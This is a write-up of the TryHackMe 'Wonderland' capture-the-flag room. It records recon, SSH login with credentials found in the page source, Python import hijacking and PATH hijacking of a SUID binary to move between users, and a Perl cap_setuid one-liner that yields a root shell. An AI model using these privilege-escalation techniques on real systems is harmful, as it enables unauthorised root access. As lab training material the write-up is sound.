# TryHackMe: Wonderland

- Linux CTF
- https://tryhackme.com/room/wonderland

## Recon

### Nmap

- SSH 22 openssh 7.6p1
- HTTP 80 Golang net/http (Go-IPFS json-rpc or InfluxDB API)

```
kali@kali:~/Desktop/repos/ctf/try-hack-me/wonderland$ nmap -A 10.10.160.113 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-28 21:14 BST
Nmap scan report for 10.10.160.113
Host is up (0.036s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### Gobuster

```
kali@kali:~/Desktop/repos/ctf/try-hack-me/wonderland$ gobuster dir -u http://10.10.160.113 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x txt,htm,rar,zip,jpg -t 100
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.160.113
[+] Threads:        100
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,htm,rar,zip,jpg
[+] Timeout:        10s
===============================================================
2020/09/28 21:18:00 Starting gobuster
===============================================================
/img (Status: 301)
/index.html (Status: 301)
/r (Status: 301)
===============================================================
2020/09/28 21:18:20 Finished
===============================================================
```

### Manual

#### Home
```
Follow the White Rabbit.

"Curiouser and curiouser!" cried Alice (she was so much surprised, that for the moment she quite forgot how to speak good English)
```

#### Start at /r

Reran gobuster on /r, found /a, .. /b, .. /b, /i/t.

Browsed to /r/a/b/b/i/t in browser. 

Found credentials in hidden `<p>` tags.

```
alice:HowDothTheLittleCrocodileImproveHisShiningTail
```

## Gaining access

### SSH as alice

```shell
kali@kali:~/Desktop/repos/ctf/try-hack-me/wonderland$ ssh alice@10.10.160.113
The authenticity of host '10.10.160.113 (10.10.160.113)' can't be established.
ECDSA key fingerprint is SHA256:HUoT05UWCcf3WRhR5kF7yKX1yqUvNhjqtxuUMyOeqR8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.160.113' (ECDSA) to the list of known hosts.
alice@10.10.160.113's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Sep 28 20:28:47 UTC 2020

  System load:  0.08               Processes:           85
  Usage of /:   18.9% of 19.56GB   Users logged in:     0
  Memory usage: 16%                IP address for eth0: 10.10.160.113
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon May 25 16:37:21 2020 from 192.168.170.1
alice@wonderland:~$ 
```

### Find user flag

`/home/alice` contains _`root`_ flag, though cannot access yet.

```
alice@wonderland:~$ ls -lah
total 40K
drwxr-xr-x 5 alice alice 4.0K May 25 17:52 .
drwxr-xr-x 6 root  root  4.0K May 25 17:52 ..
lrwxrwxrwx 1 root  root     9 May 25 17:52 .bash_history -> /dev/null
-rw-r--r-- 1 alice alice  220 May 25 02:36 .bash_logout
-rw-r--r-- 1 alice alice 3.7K May 25 02:36 .bashrc
drwx------ 2 alice alice 4.0K May 25 16:37 .cache
drwx------ 3 alice alice 4.0K May 25 16:37 .gnupg
drwxrwxr-x 3 alice alice 4.0K May 25 02:52 .local
-rw-r--r-- 1 alice alice  807 May 25 02:36 .profile
-rw------- 1 root  root    66 May 25 17:08 root.txt
-rw-r--r-- 1 root  root  3.5K May 25 02:43 walrus_and_the_carpenter.py
```

Alice can run sudo command as `rabbit`.

```shell
alice@wonderland:~$ sudo -l
[sudo] password for alice: 
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

Python file `walrus_and_the_carpenter.py` contains an excerpt in a string, and some randomized execution.

```python
poem="....." #long excerpt here

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line) #look into :\t incase of exploit
```

Others users with `/home` directories.

```shell
alice@wonderland:/home$ ls -lah
total 24K
drwxr-xr-x  6 root      root      4.0K May 25 17:52 .
drwxr-xr-x 23 root      root      4.0K May 25 00:23 ..
drwxr-xr-x  5 alice     alice     4.0K Sep 28 20:32 alice
drwxr-x---  3 hatter    hatter    4.0K May 25 22:56 hatter
drwxr-x---  2 rabbit    rabbit    4.0K May 25 17:58 rabbit
drwxr-x---  6 tryhackme tryhackme 4.0K May 25 22:59 tryhackme
```

Alice can run `/usr/bin/python3.6` as `rabbit`... python__3.6__. Perhaps we can spawn shell as `rabbit`.

```shell
sudo -u rabbit python3.6 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

Can't spawn shell as rabbit; must be used specifically on the walrus file in `/alice/home`.

```shell
alice@wonderland:/usr/bin$ sudo -u rabbit python3.6 /home/alice/walrus_and_the_carpenter.py
```

### Get user flag

Hint on THM is 'everything is upside down'.
/home/alice contains root.txt
/root contains user.txt

```shell
alice@wonderland:~$ cat /root/user.txt
thm{REDACTED}
alice@wonderland:~$ ls -lah
total 52K
drwxr-xr-x 6 alice alice 4.0K Sep 28 21:41 .
drwxr-xr-x 6 root  root  4.0K May 25 17:52 ..
lrwxrwxrwx 1 root  root     9 May 25 17:52 .bash_history -> /dev/null
-rw-r--r-- 1 alice alice  220 May 25 02:36 .bash_logout
-rw-r--r-- 1 alice alice 3.7K May 25 02:36 .bashrc
drwx------ 2 alice alice 4.0K May 25 16:37 .cache
drwxr-x--- 3 alice alice 4.0K Sep 28 21:41 .config
drwx------ 3 alice alice 4.0K May 25 16:37 .gnupg
drwxrwxr-x 3 alice alice 4.0K May 25 02:52 .local
-rw-r--r-- 1 alice alice  807 May 25 02:36 .profile
-rw------- 1 alice alice  417 Sep 28 21:12 .python_history
-rw-rw-r-- 1 alice alice   66 Sep 28 21:02 .selected_editor
-rw------- 1 root  root    66 May 25 17:08 root.txt
-rw-r--r-- 1 root  root  3.5K May 25 02:43 walrus_and_the_carpenter.py
```

## Get shell as rabbit

Python file `walrus..py` contains an import line. It imports `random`. We can override the import by making a local `random.py` file.

```python
# random.py (attempt to read root.txt)

root_file = open('/home/alice/root.txt', 'r')
def choice(input):
    print("Thanks for your input: %s " % (input))
    print("But this is more interesting: %s" % (root_file.read())
```

Rabbit doesn't have rights to read the root.txt file. Perhaps we can spawn shell instead.

```python
# random.py (attempt to get shell)
import pty
def choice(input):
    print("Thanks for your input: %s " % (input))
    pty.spawn("/bin/sh")
    break
```

Above works, and we get shell as rabbit.

```shell
## After spawning shell as rabbit
$ whoami
rabbit
```

## Get shell as Hatter

Upgraded shell to bash

```shell
$ bash
rabbit@wonderland:~$
```

Moved to /home/rabbit; found root owned executable, TeaParty.

```shell
rabbit@wonderland:~$ cd /home/rabbit/
rabbit@wonderland:/home/rabbit$ ls -lah
total 40K
drwxr-x--- 2 rabbit rabbit 4.0K May 25 17:58 .
drwxr-xr-x 6 root   root   4.0K May 25 17:52 ..
lrwxrwxrwx 1 root   root      9 May 25 17:53 .bash_history -> /dev/null
-rw-r--r-- 1 rabbit rabbit  220 May 25 03:01 .bash_logout
-rw-r--r-- 1 rabbit rabbit 3.7K May 25 03:01 .bashrc
-rw-r--r-- 1 rabbit rabbit  807 May 25 03:01 .profile
-rwsr-sr-x 1 root   root    17K May 25 17:58 teaParty
```

TeaParty is an _ELF_? File.

```shell
?ELF^B^A^A^@^@^@^@^@^@^@^@^@^C^@>^@^A^@^@^@�^P^@^@^@^@^@^@@^@^@^@^@^@^@^@0:^@^$
^@^@^@^A^@^@^@^F^@^@^@^@^@�^@^@^@^@^@
^@^@^@^@^@^@^@�e�m^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@Z^@^@$
^@^@^@^@^@^@^@^@^@^@^@^X@^@^@^@^@^@^@^G^@^@^@^B^@^@^@^@^@^@^@^@^@^@^@ @^@^@^@^@$
The Mad Hatter will be here soon.^@^@^@^@^@/bin/echo -n 'Probably by ' && date $
^@^@^@^@^@^@^@�^@^@^@^@^@^@^@^K^@^@^@^@^@^@^@^X^@^@^@^@^@^@^@^U^@^@^@^@^@^@^@^@$
^@�^E^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^C^@^K^@^@^P^@^@^@^@^@^@^@^@^@^@^@^@^@$

```

Notably, the file calls `date`. We can probably exploit that. On running, we get the following.

```
rabbit@wonderland:/home/rabbit$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Mon, 28 Sep 2020 22:59:34 +0000
Ask very nicely, and I will give you some tea while you wait for him
```

Create a new `./date`.

```bash
touch ./date;
chmod 777 ./date;
```

Put in a test.

```shell
nano ./date;
## When nano opens, add the following
whoami
## And save the file, Ctrl S, Ctrl X
```

Add the current directory to the PATH environment variables. 

```shell
export PATH="/home/rabbit/:$PATH"
```

Then run `date`..

```shell
rabbit@wonderland:/home/rabbit$ date
rabbit
## Can confirm date now returns the current users username
```

Run ./teaParty..

```shell
rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter ## notice how date command now returns HATTER
Ask very nicely, and I will give you some tea while you wait for him
```

Lets create a reverse shell so we can hijack hatter.

```shell
nano ./date
## add the following
/bin/sh -i 
```

We get hatter shell

```
rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by $ whoami
hatter
```

## Get root shell

Upgrade shell, move to /home/hatter

```shell
$ bash
hatter@wonderland:/home/rabbit$ cd /home/hatter
hatter@wonderland:/home/hatter$ ls -lah
total 28K
drwxr-x--- 3 hatter hatter 4.0K May 25 22:56 .
drwxr-xr-x 6 root   root   4.0K May 25 17:52 ..
lrwxrwxrwx 1 root   root      9 May 25 17:53 .bash_history -> /dev/null
-rw-r--r-- 1 hatter hatter  220 May 25 02:58 .bash_logout
-rw-r--r-- 1 hatter hatter 3.7K May 25 02:58 .bashrc
drwxrwxr-x 3 hatter hatter 4.0K May 25 03:42 .local
-rw-r--r-- 1 hatter hatter  807 May 25 02:58 .profile
-rw------- 1 hatter hatter   29 May 25 22:56 password.txt
```

Get hatter password

```shell
hatter@wonderland:/home/hatter$ cat password.txt 
WhyIsARavenLikeAWritingDesk?
```

Hatter cannot run as root 
```shell
hatter@wonderland:/home/hatter$ sudo -l 
[sudo] password for hatter: 
Sorry, user hatter may not run sudo on wonderland.
```

Searched for files with root SUID.

```shell
hatter@wonderland:/home/hatter$ find / -type f -perm /4000 2>/dev/null
/home/rabbit/teaParty
```

Search for capabilities. Perl has capability to set UID. This could be exploited to set UID to root UID (0).

```shell
hatter@wonderland:/$ getcap -r / 2>/dev/null
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```

At this point, we need to switch from the many shells in shells as it causes /usr/bin/perl to break.

Exit out of all shells, and SSH into to box as `hatter`.

Credentials: 
```
hatter:WhyIsARavenLikeAWritingDesk?
```

```
ssh hatter@10.10.160.113
```
No we can use Perl GTFOBin through capabilities: 
https://gtfobins.github.io/gtfobins/perl/#capabilities

```shell
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

```shell
hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# whoami
root
```

## Get root flag
```shell
## Go back to /home/alice
# cd /home/alice
# ls -lah
total 56K
drwxr-xr-x 6 alice alice 4.0K Sep 28 21:54 .
drwxr-xr-x 6 root  root  4.0K May 25 17:52 ..
lrwxrwxrwx 1 root  root     9 May 25 17:52 .bash_history -> /dev/null
-rw-r--r-- 1 alice alice  220 May 25 02:36 .bash_logout
-rw-r--r-- 1 alice alice 3.7K May 25 02:36 .bashrc
drwx------ 2 alice alice 4.0K May 25 16:37 .cache
drwxr-x--- 3 alice alice 4.0K Sep 28 21:41 .config
drwx------ 3 alice alice 4.0K May 25 16:37 .gnupg
drwxrwxr-x 3 alice alice 4.0K May 25 02:52 .local
-rw-r--r-- 1 alice alice  807 May 25 02:36 .profile
-rw------- 1 alice alice  417 Sep 28 21:12 .python_history
-rw-rw-r-- 1 alice alice   66 Sep 28 21:02 .selected_editor
-rw-rw-r-- 1 alice alice  188 Sep 28 21:54 random.py
-rw------- 1 root  root    66 May 25 17:08 root.txt
-rw-r--r-- 1 root  root  3.5K May 25 02:43 walrus_and_the_carpenter.py
# cat root.txt
thm{REDACTED}
```




